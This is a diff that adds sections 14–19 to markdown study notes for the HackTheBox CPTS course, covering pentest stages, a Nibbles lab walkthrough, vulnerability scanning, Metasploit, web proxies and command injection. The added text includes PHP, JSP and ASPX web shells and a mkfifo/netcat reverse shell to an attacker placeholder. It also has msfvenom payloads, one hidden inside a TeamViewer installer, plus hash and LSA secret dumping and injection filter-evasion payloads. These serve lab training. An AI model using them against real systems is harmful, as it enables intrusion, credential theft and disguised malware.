@@ -224,7 +224,54 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
   - [Hardening Considerations](#hardening-considerations)
   - [Skills Assessment](#skills-assessment)
   - [References](#references)
-- [14. Useful Resources](#14-useful-resources)
+- [14. Penetration Testing Process](#14-penetration-testing-process)
+  - [Engagement Stages](#engagement-stages)
+    - [Pre-Engagement](#pre-engagement)
+    - [Information Gathering](#information-gathering-1)
+    - [Vulnerability Assessment](#vulnerability-assessment)
+    - [Exploitation](#exploitation)
+    - [Post-Exploitation](#post-exploitation)
+    - [Lateral Movement](#lateral-movement)
+    - [Proof-of-Concept](#proof-of-concept)
+    - [Post-Engagement](#post-engagement)
+  - [Practice](#practice)
+- [15. Getting Started](#15-getting-started)
+  - [Setup](#setup)
+  - [Basic Workflow](#basic-workflow)
+  - [Shells and Stabilization](#shells-and-stabilization)
+  - [Privilege Escalation and File Transfer](#privilege-escalation-and-file-transfer)
+  - [Nibbles Walkthrough](#nibbles-walkthrough)
+  - [Common Pitfalls](#common-pitfalls)
+- [16. Vulnerability Assessment](#16-vulnerability-assessment)
+  - [Assessment Types](#assessment-types)
+  - [Scoring and References](#scoring-and-references)
+  - [Nessus](#nessus)
+  - [OpenVAS / GVM](#openvas--gvm)
+  - [Reporting](#reporting)
+- [17. Using the Metasploit Framework](#17-using-the-metasploit-framework)
+  - [MSFconsole Basics](#msfconsole-basics)
+  - [Modules, Targets, and Payloads](#modules-targets-and-payloads)
+  - [Encoders and Evasion](#encoders-and-evasion)
+  - [Database and Workspaces](#database-and-workspaces)
+  - [Sessions and Jobs](#sessions-and-jobs)
+  - [Meterpreter](#meterpreter)
+  - [Writing and Importing Modules](#writing-and-importing-modules)
+  - [MSFvenom and Handlers](#msfvenom-and-handlers)
+  - [Wrapping and Packing](#wrapping-and-packing)
+  - [References](#references-1)
+- [18. Using Web Proxies](#18-using-web-proxies)
+  - [Proxy Setup](#proxy-setup)
+  - [Core Workflow](#core-workflow)
+  - [Proxying Command-Line Tools](#proxying-command-line-tools)
+  - [Useful Burp/ZAP Features](#useful-burpzap-features)
+- [19. Command Injections](#19-command-injections)
+  - [Detection](#detection)
+  - [Basic Exploitation](#basic-exploitation)
+  - [Filter Evasion](#filter-evasion)
+  - [Obfuscation Tools](#obfuscation-tools)
+  - [Blind / Out-of-Band Checks](#blind--out-of-band-checks)
+  - [Prevention](#prevention)
+- [20. Useful Resources](#20-useful-resources)
 
 </details>
 
@@ -3625,7 +3672,679 @@ The module's skills assessment is intentionally not summarized here. Complete it
 - [pspy](https://github.com/DominicBreuker/pspy)
 - [Payloads All The Things — Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
-## 14. Useful Resources
+## 14. Penetration Testing Process
+
+> Condensed from HTB Academy **Penetration Testing Process** (module 90). This is the engagement workflow and closeout checklist behind the technical sections.
+
+### Engagement Stages
+
+```text
+Pre-Engagement
+  -> Information Gathering
+  -> Vulnerability Assessment
+  -> Exploitation
+  -> Post-Exploitation
+  -> Lateral Movement
+  -> Proof-of-Concept
+  -> Post-Engagement
+```
+
+#### Pre-Engagement
+
+- Define scope, targets, exclusions, and testing windows.
+- Agree on rules of engagement (RoE), emergency contacts, and escalation paths.
+- Confirm authorization, contracts, and any third-party/contractor agreements.
+- Hold a kick-off meeting; document assumptions and communication channels.
+- Prepare infrastructure, tooling, and a secure location for evidence.
+
+#### Information Gathering
+
+- Open-source intelligence: employees, infrastructure, leaks, public documents.
+- Infrastructure enumeration: domains, subdomains, IP ranges, cloud assets.
+- Service enumeration: ports, versions, banners, exposed admin interfaces.
+- Host enumeration: users, shares, local services, installed software.
+- Pillaging: collect data that informs later phases without disrupting the target.
+
+#### Vulnerability Assessment
+
+- Research known vulnerabilities for discovered versions and configurations.
+- Map possible attack vectors and rank them by likelihood and impact.
+- Return to enumeration when a vector needs more detail.
+
+#### Exploitation
+
+- Prioritize attacks by expected impact and reliability.
+- Prepare payloads, listeners, and fallback options.
+- Confirm access and document every step for the report.
+
+#### Post-Exploitation
+
+- Evasive testing where required by the RoE.
+- Local information gathering and pillaging.
+- Persistence only when explicitly in scope.
+- Local vulnerability assessment and privilege escalation.
+- Data exfiltration only within the agreed scope.
+
+#### Lateral Movement
+
+- Pivot into newly reachable networks.
+- Repeat evasive testing, enumeration, vulnerability assessment, exploitation, and post-exploitation on each new host.
+
+#### Proof-of-Concept
+
+- Demonstrate impact with the minimum necessary access.
+- Capture commands, timestamps, screenshots, and evidence hashes.
+- Avoid changes that are not required for the proof.
+
+#### Post-Engagement
+
+- Clean up shells, accounts, files, and configuration changes.
+- Write the report: executive summary, technical findings, evidence, remediation.
+- Hold a report review meeting and obtain deliverable acceptance.
+- Offer post-remediation testing and define data-retention/close-out terms.
+
+### Practice
+
+- Re-run the full workflow on labs and retired boxes.
+- Keep a checklist for each phase so nothing is skipped under time pressure.
+
+## 15. Getting Started
+
+> Condensed from HTB Academy **Getting Started** (module 77). Much of the basic tooling is already covered in sections 2–7; this section keeps the end-to-end HTB workflow and the Nibbles walkthrough.
+
+### Setup
+
+```bash
+# Connect to the lab VPN
+sudo openvpn user.ovpn
+
+# Confirm the tunnel address and routes
+ip -4 a show tun0
+sudo netstat -rn
+
+# Organize engagement files
+tree Projects/
+```
+
+Use a note-taking structure per target: scans, credentials, screenshots, and findings.
+
+### Basic Workflow
+
+1. **Enumeration** — `nmap -sV -sC -p- <TARGET_IP>`; then inspect each open service.
+2. **Web enumeration** — `whatweb`, `curl -IL`, `gobuster dir`/`dns`.
+3. **Public exploits** — `searchsploit`, then validate the exploit before running it.
+4. **Initial access** — reverse/bind/web shell, then stabilize the TTY.
+5. **Privilege escalation** — local enumeration, `sudo -l`, SUID/SGID, kernel version.
+6. **File transfer** — HTTP server, SCP, base64, or the target's native tools.
+
+```bash
+# Service and web discovery
+nmap -sV -sC -p- <TARGET_IP>
+nmap --script smb-os-discovery.nse -p445 <TARGET_IP>
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+whatweb <TARGET_IP>
+
+# SMB and SNMP examples
+smbclient -N -L \\\\<TARGET_IP>
+smbclient -U <USER> \\\\<TARGET_IP>\\<SHARE>
+snmpwalk -v 2c -c <COMMUNITY> <TARGET_IP>
+
+# Public exploit lookup
+searchsploit openssh 7.2
+msfconsole -q
+```
+
+### Shells and Stabilization
+
+```bash
+# Listener
+nc -lvnp 1234
+
+# Upgrade a basic shell to a PTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl-Z, then:
+stty raw -echo; fg
+export TERM=xterm
+stty rows 40 cols 120
+```
+
+Web shell examples:
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+```aspx
+<% eval request("cmd") %>
+```
+
+### Privilege Escalation and File Transfer
+
+```bash
+./linpeas.sh
+sudo -l
+sudo -u <USER> /bin/echo Hello World!
+
+# SSH key reuse
+chmod 600 id_rsa
+ssh root@<TARGET_IP> -i id_rsa
+
+# Serve files from the attack host
+python3 -m http.server 8000
+
+# Transfer with SCP
+scp linenum.sh <USER>@<TARGET_IP>:/tmp/linenum.sh
+```
+
+### Nibbles Walkthrough
+
+A compact example of the full workflow. Replace `<TARGET_IP>` and redacted secrets.
+
+```bash
+# Enumeration
+nmap -sV --open -oA nibbles_initial_scan <TARGET_IP>
+nmap -sC -p 22,80 -oA nibbles_script_scan <TARGET_IP>
+nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <TARGET_IP>
+
+# Web footprinting
+whatweb http://<TARGET_IP>
+curl http://<TARGET_IP>
+gobuster dir -u http://<TARGET_IP>/nibbleblog/ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt
+curl -s http://<TARGET_IP>/nibbleblog/README
+curl -s http://<TARGET_IP>/nibbleblog/content/private/users.xml | xmllint --format -
+curl -s http://<TARGET_IP>/nibbleblog/content/private/config.xml | xmllint --format -
+```
+
+The admin credentials are found during enumeration; use them only in the lab. After uploading a PHP plugin shell:
+
+```bash
+curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+Privilege escalation via a writable monitor script:
+
+```bash
+unzip personal.zip
+cat monitor.sh
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f' | tee -a monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+Metasploit alternative:
+
+```text
+msf6 > search nibbleblog
+msf6 > use 0
+msf6 > set rhosts <TARGET_IP>
+msf6 > set lhost <ATTACKER_IP>
+msf6 > set username admin
+msf6 > set password <PASSWORD>
+msf6 > set targeturi nibbleblog
+msf6 > set payload generic/shell_reverse_tcp
+msf6 > exploit
+```
+
+### Common Pitfalls
+
+```bash
+# VPN not connecting
+sudo openvpn ./htb.ovpn
+ip -4 a show tun0
+ping -c 4 10.10.14.1
+
+# Regenerate missing SSH keys
+ssh-keygen
+```
+
+- Re-scan after changes; services and versions may differ from the first scan.
+- Stabilize shells before running interactive tools.
+- Keep a log of every command and result for the report.
+
+## 16. Vulnerability Assessment
+
+> Condensed from HTB Academy **Vulnerability Assessment** (module 108).
+
+### Assessment Types
+
+- **Vulnerability assessment** — identify and rank weaknesses; no exploitation.
+- **Penetration test** — validate impact through controlled exploitation.
+- **Compliance/audit** — measure against a standard or framework.
+- **Standards** — PTES, OWASP WSTG, NIST, CIS, ISO 27001, PCI DSS.
+
+### Scoring and References
+
+- **CVSS** — base, temporal, and environmental scores; use the vector string in reports.
+- **CVE** — public identifier for a specific vulnerability.
+- **CWE** — weakness class; useful for root-cause and remediation guidance.
+- Validate scanner findings manually; scanners produce false positives and false negatives.
+
+### Nessus
+
+```bash
+# Install and start the daemon
+sudo dpkg -i Nessus-<VERSION>-ubuntu910_amd64.deb
+sudo systemctl start nessusd.service
+
+# Open the web UI (default https://<SCANNER_IP>:8834), then create a scan
+```
+
+Useful scan profiles: basic network scan, credentialed patch audit, web application tests, malware scan. Review false positives and export results.
+
+```bash
+# Example export helper
+./nessus_downloader.rb
+
+# SSL/TLS checks
+sslscan example.com
+
+# Interface/bandwidth checks during large scans
+sudo apt install vnstat
+sudo vnstat -l -i <INTERFACE>
+```
+
+### OpenVAS / GVM
+
+```bash
+sudo apt-get update && sudo apt-get -y full-upgrade
+sudo apt-get install gvm && openvas
+sudo gvm-setup
+sudo gvm-start
+
+# Export a report to XLSX
+python3 -m openvasreporting -i report-<ID>.xml -f xlsx
+```
+
+### Reporting
+
+- Executive summary: scope, approach, risk posture, top findings.
+- Technical findings: description, affected asset, evidence, CVSS, remediation.
+- Include positive controls and retest guidance.
+- Store evidence and reports according to the engagement's data-retention terms.
+
+## 17. Using the Metasploit Framework
+
+> Condensed from HTB Academy **Using the Metasploit Framework** (module 39).
+
+### MSFconsole Basics
+
+```bash
+msfconsole
+msfconsole -q
+```
+
+```text
+msf6 > help
+msf6 > version
+msf6 > show modules
+msf6 > search <term>
+msf6 > use <module>
+msf6 > info
+msf6 > options
+msf6 > back
+```
+
+### Modules, Targets, and Payloads
+
+```text
+msf6 > search eternalromance
+msf6 > search eternalromance type:exploit
+msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
+
+msf6 > use 0
+msf6 > show options
+msf6 > show targets
+msf6 > set target <ID>
+msf6 > show payloads
+msf6 > set payload <PAYLOAD>
+msf6 > set RHOSTS <TARGET_IP>
+msf6 > set LHOST <ATTACKER_IP>
+msf6 > set LPORT <PORT>
+msf6 > check
+msf6 > run
+msf6 > exploit
+```
+
+Use `setg` for global options and `unsetg` to clear them:
+
+```text
+msf6 > setg RHOSTS <TARGET_IP>
+msf6 > setg LHOST <ATTACKER_IP>
+msf6 > unsetg RHOSTS
+```
+
+Filtering payloads:
+
+```text
+msf6 > grep meterpreter show payloads
+msf6 > grep -c meterpreter show payloads
+msf6 > grep meterpreter grep reverse_tcp show payloads
+```
+
+### Encoders and Evasion
+
+```text
+msf6 > show encoders
+msf6 > set encoder <ENCODER>
+msf6 > set EnableStageEncoding true
+```
+
+```bash
+# Legacy pipeline (msfpayload/msfencode)
+msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
+  msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+
+# Modern msfvenom
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
+  LHOST=<ATTACKER_IP> LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+```
+
+Encoders are not a substitute for testing against the target's AV/EDR. Check payloads with `msf-virustotal` using your own API key.
+
+### Database and Workspaces
+
+```bash
+sudo service postgresql status
+sudo systemctl start postgresql
+sudo msfdb init
+sudo msfdb status
+sudo msfdb run
+```
+
+```text
+msf6 > db_status
+msf6 > workspace
+msf6 > workspace -a <ENGAGEMENT>
+msf6 > workspace <ENGAGEMENT>
+msf6 > db_nmap -sV -sS <TARGET_IP>
+msf6 > hosts
+msf6 > services
+msf6 > creds
+msf6 > loot
+msf6 > db_import <SCAN_FILE>.xml
+msf6 > db_export -f xml backup.xml
+```
+
+### Sessions and Jobs
+
+```text
+msf6 > sessions
+msf6 > sessions -i <ID>
+msf6 > jobs
+msf6 > jobs -l
+msf6 > exploit -j
+```
+
+### Meterpreter
+
+```text
+meterpreter > help
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > ps
+meterpreter > steal_token <PID>
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > lsa_dump_sam
+meterpreter > lsa_dump_secrets
+meterpreter > shell
+meterpreter > background
+```
+
+Local privilege escalation workflow:
+
+```text
+msf6 > search local_exploit_suggester
+msf6 > use 0
+msf6 > set SESSION <ID>
+msf6 > run
+msf6 > use exploit/windows/local/<MODULE>
+msf6 > set SESSION <ID>
+msf6 > set LHOST <ATTACKER_IP>
+msf6 > run
+meterpreter > getuid
+```
+
+### Writing and Importing Modules
+
+```bash
+ls /usr/share/metasploit-framework/modules
+ls ~/.msf4/modules
+cp <MODULE>.rb /usr/share/metasploit-framework/modules/exploits/<PATH>/
+```
+
+```text
+msf6 > reload_all
+msf6 > loadpath /usr/share/metasploit-framework/modules/
+msf6 > use <MODULE>
+```
+
+### MSFvenom and Handlers
+
+```bash
+# Windows executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f exe -o shell.exe
+
+# ASPX payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f aspx > reverse_shell.aspx
+```
+
+```text
+msf6 > use multi/handler
+msf6 > set payload windows/meterpreter/reverse_tcp
+msf6 > set LHOST <ATTACKER_IP>
+msf6 > set LPORT 1337
+msf6 > run
+```
+
+### Wrapping and Packing
+
+```bash
+# Embed a payload in a legitimate executable
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 \
+  -k -x TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows \
+  -o TeamViewer_Setup_payload.exe -i 5
+
+# Optional archive wrapping (not encryption)
+rar a payload.rar -p payload.js
+```
+
+### References
+
+- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
+- [Rapid7 Metasploit documentation](https://docs.rapid7.com/metasploit/)
+
+## 18. Using Web Proxies
+
+> Condensed from HTB Academy **Using Web Proxies** (module 110). Burp Suite and ZAP are GUI-driven; this section records the setup and the command-line integration points.
+
+### Proxy Setup
+
+1. Start Burp or ZAP and confirm the proxy listener (default `127.0.0.1:8080`).
+2. Point Firefox at the proxy, or use the tool's pre-configured browser.
+3. Install the proxy's CA certificate and trust it for websites.
+4. Verify HTTPS interception works before testing.
+
+Burp: `Proxy > Proxy settings > Proxy listeners`.
+ZAP: `Tools > Options > Network > Local Servers/Proxies`.
+
+### Core Workflow
+
+- **Intercept** — pause, inspect, and modify requests/responses.
+- **Repeater** — resend a request with manual changes; useful for auth, IDOR, injection.
+- **Intruder / Fuzzer** — automate payload positions, wordlists, and attack types.
+- **Scanner** — active/passive checks; validate findings manually.
+- **Extensions** — install only from trusted sources.
+
+### Proxying Command-Line Tools
+
+`proxychains`:
+
+```bash
+# /etc/proxychains.conf
+# socks4 127.0.0.1 9050
+http 127.0.0.1 8080
+```
+
+```bash
+proxychains -q curl http://<TARGET>
+```
+
+Nmap (experimental):
+
+```bash
+nmap -h | grep -i prox
+nmap --proxies http://127.0.0.1:8080 <TARGET_IP> -p<PORT> -Pn -sC
+```
+
+Metasploit:
+
+```text
+msf6 > use auxiliary/scanner/http/robots_txt
+msf6 > set PROXIES HTTP:127.0.0.1:8080
+msf6 > set RHOST <TARGET_IP>
+msf6 > set RPORT <PORT>
+msf6 > run
+```
+
+Other tools: set `HTTP_PROXY`/`HTTPS_PROXY` where supported, or use the tool's `--proxy`/`-x` flag. Proxy only when inspecting traffic; it slows tools down.
+
+### Useful Burp/ZAP Features
+
+- Match/replace rules for automatic header or parameter changes.
+- Scope and target filtering to avoid noise.
+- Decoder for URL/base64/hex transformations.
+- Comparer for response diffing.
+- Save project files and export findings.
+
+## 19. Command Injections
+
+> Condensed from HTB Academy **Command Injections** (module 109).
+
+### Detection
+
+Identify inputs that reach OS commands (for example a Host Checker running `ping -c 1 <INPUT>`). Try appending an operator and a harmless command; a change in output indicates injection.
+
+| Operator | Character | URL-encoded | Behavior |
+|---|---|---|---|
+| Semicolon | `;` | `%3b` | Both commands |
+| New line | `\n` | `%0a` | Both commands |
+| Background | `&` | `%26` | Both commands |
+| Pipe | `\|` | `%7c` | Both, only second output |
+| AND | `&&` | `%26%26` | Both, if first succeeds |
+| OR | `\|\|` | `%7c%7c` | Second, if first fails |
+| Sub-shell | \` | `%60%60` | Both (Linux) |
+| Sub-shell | `$()` | `%24%28%29` | Both (Linux) |
+
+### Basic Exploitation
+
+```bash
+# Local validation
+ping -c 1 127.0.0.1; whoami
+ping -c 1 127.0.0.1 && whoami
+ping -c 1 127.0.0.1 || whoami
+ping -c 1 || whoami
+```
+
+If front-end validation blocks the payload, intercept the request in Burp/ZAP, URL-encode the payload (`Ctrl+U` in Burp), and send it directly to the back end.
+
+```http
+POST /check HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+ip=127.0.0.1%3b+whoami
+```
+
+### Filter Evasion
+
+**Spaces:**
+
+```bash
+cat</etc/passwd
+cat${IFS}/etc/passwd
+{cat,/etc/passwd}
+cat%09/etc/passwd
+```
+
+**Blacklisted characters:**
+
+```bash
+echo ${PATH}
+echo ${PATH:0:1}          # /
+echo ${LS_COLORS:10:1}    # ;
+echo %HOMEPATH:~6,-11%    # Windows
+$env:HOMEPATH[0]          # PowerShell
+```
+
+Build characters from variables or use encoding/`tr` to avoid literal blacklist entries.
+
+**Blacklisted commands:**
+
+```bash
+who^ami                    # Windows CMD
+w'h'o'a'm'i                # shell quote insertion
+w\h\o\a\m\i                # backslash insertion
+"whoami"
+```
+
+**Case and string manipulation:**
+
+```bash
+WhOaMi
+echo 'whoami' | rev
+"whoami"[-1..-20] -join ''            # PowerShell
+iex "$('imaohw'[-1..-20] -join '')"  # PowerShell
+```
+
+**Base64 and encoding:**
+
+```bash
+echo -n 'cat /etc/passwd | grep 33' | base64
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+# PowerShell
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+### Obfuscation Tools
+
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+pip3 install setuptools==65
+python3 setup.py install --user
+cd ./bashfuscator/bin/
+./bashfuscator -c 'cat /etc/passwd'
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
+
+```powershell
+git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
+cd Invoke-DOSfuscation
+Import-Module .\Invoke-DOSfuscation.psd1
+Invoke-DOSfuscation
+```
+
+### Blind / Out-of-Band Checks
+
+- Use time delays (`sleep`, `ping -c`) to confirm execution when output is not returned.
+- Use an HTTP/DNS callback to a host you control.
+- URL-encode payloads and test each operator separately.
+
+### Prevention
+
+- Avoid passing user input to shell commands; use language APIs and allowlists.
+- Validate input against a strict pattern (for example an IP address regex).
+- Escape shell metacharacters and use parameterized APIs.
+- Run services with least privilege and disable unnecessary shell functions.
+- Use a WAF as defense in depth, not as the only control.
+
+## 20. Useful Resources
 
 [HackTricks](https://book.hacktricks.xyz/)
 
